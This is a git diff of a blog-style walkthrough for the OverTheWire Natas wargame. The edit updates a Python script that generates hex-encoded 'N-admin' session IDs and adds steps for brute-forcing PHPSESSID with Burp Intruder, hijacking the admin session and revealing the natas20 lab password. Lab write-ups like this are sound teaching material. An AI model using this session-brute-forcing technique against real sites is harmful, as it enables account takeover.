@@ -1355,7 +1355,7 @@ def number_to_blackanon_hex(number):
         raise ValueError("Number must be between 1 and 640.")
 
     # Append "BlackAnon" to the number
-    blackanon_string = str(number) + "-BlackAnon"
+    blackanon_string = str(number) + "-admin"
 
     # Convert the string to hexadecimal representation
     hex_representation = blackanon_string.encode().hex()
@@ -1372,7 +1372,7 @@ with open("phpsessid.txt", "w") as file:
 
 print("Output has been written to phpsessid.txt")
 ```
-The script takes numbers from 1 to 640, appends "-BlackAnon" to each number, converts them to hexadecimal representation, and writes the results to a file named "phpsessid.txt."
+The script takes numbers from 1 to 640, appends "-admin" to each number, converts them to hexadecimal representation, and writes the results to a file named "phpsessid.txt."
 
 save the script in a file and run it
 
@@ -1382,19 +1382,51 @@ save the script in a file and run it
 Output has been written to phpsessid.txt
                                                                                                                                                                                                                                 
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
-└─$ cat phpsessid.txt
-312d426c61636b416e6f6e
-322d426c61636b416e6f6e
-332d426c61636b416e6f6e
-342d426c61636b416e6f6e
-352d426c61636b416e6f6e
-362d426c61636b416e6f6e
-.
-...
+└─$ head phpsessid.txt    
+312d61646d696e
+322d61646d696e
+332d61646d696e
+342d61646d696e
+352d61646d696e
+362d61646d696e
+372d61646d696e
+382d61646d696e
+392d61646d696e
+31302d61646d696e
 ```
-We'll send the request to intruder
+Lets capture the request again and send it over to burp intruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4791aae9-b59f-4998-bba4-70f37e3dcb55)
+
+We'll go ahead to load the ```phpsessid.txt``` file
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5d530025-876b-4ff8-b8eb-ce16314684e0)
+
+Now, start the attack
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/572e20cd-6378-4b6f-bdb5-572bada2b00e)
+
+From the above screenshot we can see that ```3238312d61646d696e``` has a different length compared to the other payloads
+
+We already found the admin's ```PHPSESSID``` hehe😎
+
+Replacing the cookies
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6911823f-7fdf-470e-a313-9d9e72772f33)
+
+Cool stuff, we got the password to the next level
 
 
+
+# Level 20
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/217be71f-8c33-4a74-8657-1454cd980a45)
+
+Navigating to the webpage and using the password we got from the previous level
+
+username:```natas20```          password:```guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/14e1b4b2-29b9-4da3-90bc-fc985106f7c9)
 
 
 
